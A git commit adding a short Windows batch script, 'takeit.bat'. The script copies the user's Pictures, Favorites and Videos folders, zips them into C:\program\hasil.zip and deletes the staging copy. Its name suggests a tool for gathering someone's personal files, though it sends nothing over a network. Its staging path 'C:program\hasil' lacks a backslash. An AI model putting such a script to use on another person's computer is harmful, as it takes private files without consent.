cd1adf664447253c84597ca4ba695e5f83dca4bd
dreadnought24-rgb <sofyanrezky097@gmail.com>
2026-09-11 01:38:51 +0700

    Update takeit.bat

--- mirror/takeit.bat
+++ mirror/takeit.bat
@@ -1,1 +1,15 @@
+@echo off
+set backupcmd=xcopy /s /c /d /e /h /i /r /y
+set dest=C:program\hasil
 
+%backupcmd% "%USERPROFILE%\pictures" "%dest%\My pics"
+%backupcmd% "%USERPROFILE%\Favorites" "%dest%\Favorites"
+%backupcmd% "%USERPROFILE%\videos" "%dest%\vids"
+
+:: buat zip
+powershell -command "Compress-Archive -Path '%dest%\*' -DestinationPath 'C:\program\hasil.zip' -Force"
+
+:: hapus folder mentah setelah zip berhasil dibuat
+rmdir /s /q "%dest%"
+
+pause
